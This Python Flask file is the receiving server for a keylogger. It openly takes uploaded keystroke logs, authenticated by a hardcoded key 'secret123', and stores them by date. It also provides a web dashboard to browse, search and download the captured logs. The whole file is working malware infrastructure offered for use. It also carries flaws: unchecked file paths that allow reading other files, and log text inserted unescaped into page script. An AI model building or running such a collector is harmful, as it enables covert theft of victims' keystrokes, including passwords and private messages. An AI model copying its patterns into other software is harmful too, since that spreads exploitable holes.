from flask import Flask, request, jsonify, send_from_directory, render_template_string
from datetime import datetime
from pathlib import Path

# Initialize Flask app and define directory for storing logs
app = Flask(__name__)
log_dir = Path("server_logs")
log_dir.mkdir(exist_ok=True)

API_KEY = "secret123"  # Must match with keylogger script

# Home route redirects to log folders page
@app.route("/")
def home():
    return view_log_folders()

# Route to receive log data from keylogger and save to server logs
@app.route("/upload", methods=["POST"])
def upload():
    data = request.get_json()
    if not data or data.get("api_key") != API_KEY:
        return jsonify({"status": "error", "message": "Unauthorized"}), 401

    content = data.get("log", "")
    if not content.strip():
        print("[⚠️ EMPTY LOG RECEIVED]")
        return jsonify({"status": "error", "message": "Empty log"}), 400

    now = datetime.now()
    date_folder = log_dir / now.strftime('%d-%m-%Y')
    date_folder.mkdir(parents=True, exist_ok=True)

    # Use full timestamp to avoid overwrite
    time_stamp = now.strftime('%I-%M %p')
    filename = date_folder / f"{time_stamp}.txt"

    with open(filename, "w", encoding="utf-8") as f:
        f.write(content)

    print(f"[📥 RECEIVED @ {time_stamp}] {content[:100].replace(chr(10), ' ')}...")
    print(f"[📁 SAVED TO] {filename.resolve()}")

    return jsonify({"status": "success", "message": f"Log saved: {filename.name}"}), 200

# Route to display all log folders by date
@app.route("/view-logs")
def view_log_folders():
    folders = sorted(log_dir.glob("*"), reverse=True)
    logs = [(folder.name, len(list(folder.glob("*.txt")))) for folder in folders if folder.is_dir()]

    return render_template_string("""
    <html><head><title>📁 Server Log Folders</title>
    <style>
        :root {
            --bg-color: #f5f5f5;
            --text-color: #121212;
            --box-bg: #ffffff;
        }
        body.dark {
            --bg-color: #121212;
            --text-color: #f5f5f5;
            --box-bg: #1e1e1e;
        }
        body {
            font-family: Arial;
            background-color: var(--bg-color);
            color: var(--text-color);
            padding: 40px;
            transition: background-color 0.3s ease, color 0.3s ease;
        }
        ul { list-style-type: none; padding: 0; }
        li { background: var(--box-bg); padding: 12px; margin: 8px 0; border-radius: 6px; border: 1px solid #ccc; }
        a { text-decoration: none; color: #007BFF; font-weight: bold; }
        a:hover { text-decoration: underline; }
        .btn { background: #007bff; color: white; padding: 8px 14px; border-radius: 4px; text-decoration: none; margin-bottom: 20px; display: inline-block; border: none; cursor: pointer; outline: none; }
        button:focus { outline: none; box-shadow: none; }
    </style></head>
    <body>
        <button type="button" class="btn" id="themeToggle" onclick="toggleTheme()">🌙 Dark Theme</button>
        <h2>📁 Organized Server Logs</h2>
        <ul>
        {% for date, count in logs %}
            <li><a href="/view-logs/{{ date }}">{{ date }}</a> - {{ count }} logs</li>
        {% endfor %}
        </ul>
        <script>
            function applyTheme(theme) {
                document.body.className = theme;
                document.getElementById("themeToggle").innerText = theme === "dark" ? "☀️ Light Theme" : "🌙 Dark Theme";
            }
            function toggleTheme() {
                const currentTheme = localStorage.getItem("theme") || "light";
                const newTheme = currentTheme === "dark" ? "light" : "dark";
                localStorage.setItem("theme", newTheme);
                applyTheme(newTheme);
            }
            applyTheme(localStorage.getItem("theme") || "light");
        </script>
    </body></html>
    """, logs=logs)

# Route to display logs inside a specific date folder
@app.route("/view-logs/<date>")
def view_logs_by_date(date):
    folder = log_dir / date
    if not folder.exists():
        return "Date folder not found", 404
    files = sorted(folder.glob("*.txt"))  # Oldest to newest
    log_files = [file.name for file in files]

    return render_template_string("""
    <html><head><title>📁 Logs for {{ date }}</title>
    <style>
        :root {
            --bg-color: #f5f5f5;
            --text-color: #121212;
            --box-bg: #ffffff;
        }
        body.dark {
            --bg-color: #121212;
            --text-color: #f5f5f5;
            --box-bg: #1e1e1e;
        }
        body {
            font-family: Arial;
            background-color: var(--bg-color);
            color: var(--text-color);
            padding: 40px;
            transition: background-color 0.3s ease, color 0.3s ease;
        }
        ul { list-style-type: none; padding: 0; }
        li { background: var(--box-bg); padding: 10px; margin: 5px 0; border-radius: 6px; border: 1px solid #ccc; }
        a { text-decoration: none; color: #007BFF; font-weight: bold; }
        .btn { background: #007bff; color: white; padding: 8px 14px; border-radius: 4px; text-decoration: none; margin: 5px 5px 5px 0; border: none; cursor: pointer; outline: none; }
        button:focus { outline: none; box-shadow: none; }
    </style></head>
    <body>
        <a class="btn" href="/view-logs">⬅ Back to All Folders</a>
        <button type="button" class="btn" id="themeToggle" onclick="toggleTheme()">🌙 Dark Theme</button>
        <h2>📂 Logs for {{ date }}</h2>
        <ul>
        {% for file in files %}
            <li>{{ file }} [<a href="/read-log/{{ date }}/{{ file }}">View</a>] [<a href="/download-log/{{ date }}/{{ file }}">Download</a>]</li>
        {% endfor %}
        </ul>
        <script>
            function applyTheme(theme) {
                document.body.className = theme;
                document.getElementById("themeToggle").innerText = theme === "dark" ? "☀️ Light Theme" : "🌙 Dark Theme";
            }
            function toggleTheme() {
                const currentTheme = localStorage.getItem("theme") || "light";
                const newTheme = currentTheme === "dark" ? "light" : "dark";
                localStorage.setItem("theme", newTheme);
                applyTheme(newTheme);
            }
            applyTheme(localStorage.getItem("theme") || "light");
        </script>
    </body></html>
    """, date=date, files=log_files)

# Route to download log file
@app.route("/download-log/<date>/<filename>")
def download_log(date, filename):
    folder = log_dir / date
    return send_from_directory(folder, filename, as_attachment=True)

# Route to view a specific log file
@app.route("/read-log/<date>/<filename>")
def read_log(date, filename):
    path = log_dir / date / filename
    if path.exists():
        content = path.read_text(encoding="utf-8")
        return render_template_string("""
        <html>
        <head>
            <title>{{ filename }}</title>
            <style>
                :root.light {
                    --bg-color: #f5f5f5;
                    --text-color: #121212;
                    --box-bg: #ffffff;
                }
                :root.dark {
                    --bg-color: #121212;
                    --text-color: #f5f5f5;
                    --box-bg: #1e1e1e;
                }
                body {
                    font-family: 'Courier New', monospace;
                    background-color: var(--bg-color);
                    color: var(--text-color);
                    padding: 20px;
                    transition: background-color 0.3s ease, color 0.3s ease;
                }
                .log-box {
    background-color: var(--box-bg);
    border: 1px solid #ccc;
    padding: 15px;
    border-radius: 5px;
    white-space: pre-wrap;
    line-height: 1.4;
    max-height: 500px;
    overflow-y: auto;    /* Vertical scroll only */
    overflow-x: hidden;  /* No horizontal scroll */
}

                }
                .controls {
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    margin-bottom: 20px;
                    flex-wrap: wrap;
                }
                .btn {
                    background: #007bff;
                    color: white;
                    padding: 8px 14px;
                    border-radius: 4px;
                    text-decoration: none;
                    margin: 5px 5px 5px 0;
                    border: none;
                    cursor: pointer;
                }
                .btn:hover {
                    background: #0056b3;
                }
                #searchBox {
                    padding: 8px;
                    width: 300px;
                    border-radius: 4px;
                    border: 1px solid #ccc;
                }
            </style>
        </head>
        <body>
            <div class="controls">
                <div>
                    <a class="btn" href="/view-logs/{{ date }}">⬅ Back to {{ date }} Logs</a>
                    <a class="btn" href="/download-log/{{ date }}/{{ filename }}">⬇ Download as TXT</a>
                    <button class="btn" id="themeToggle" onclick="toggleTheme()">🌙 Dark Theme</button>
                </div>
                <input type="text" id="searchBox" onkeyup="searchLog()" placeholder="🔍 Search in log...">
            </div>

            <h2>{{ filename }}</h2>
            <div class="log-box" id="logContent">{{ content }}</div>

            <script>
    function applyTheme(theme) {
        document.documentElement.className = theme;
        document.getElementById("themeToggle").innerText =
            theme === "dark" ? "☀️ Light Theme" : "🌙 Dark Theme";
    }
    function toggleTheme() {
        const currentTheme = localStorage.getItem("theme") || "light";
        const newTheme = currentTheme === "dark" ? "light" : "dark";
        localStorage.setItem("theme", newTheme);
        applyTheme(newTheme);
    }
    applyTheme(localStorage.getItem("theme") || "light");

    // Preload original log lines
    const original = `{{ content }}`.split("\\n");

    function escapeHTML(text) {
        return text.replace(/&/g, "&amp;")
                   .replace(/</g, "&lt;")
                   .replace(/>/g, "&gt;");
    }

    function searchLog() {
        const q = document.getElementById("searchBox").value.toLowerCase();
        const box = document.getElementById("logContent");

        if (!q) {
            box.innerHTML = original.map(escapeHTML).join("<br>");
            return;
        }

        const result = original.filter(line => line.toLowerCase().includes(q)).map(line => {
            const safeLine = escapeHTML(line);
            const regex = new RegExp(`(${q})`, "gi");
            return safeLine.replace(regex, `<mark>$1</mark>`);
        });

        box.innerHTML = result.join("<br>");
    }
</script>

        </body>
        </html>
        """, date=date, filename=filename, content=content)
    return "Log not found", 404


# Start the server
if __name__ == "__main__":
    print("SERVER LOG FOLDER →", log_dir.resolve())
    app.run(host="0.0.0.0", port=5000)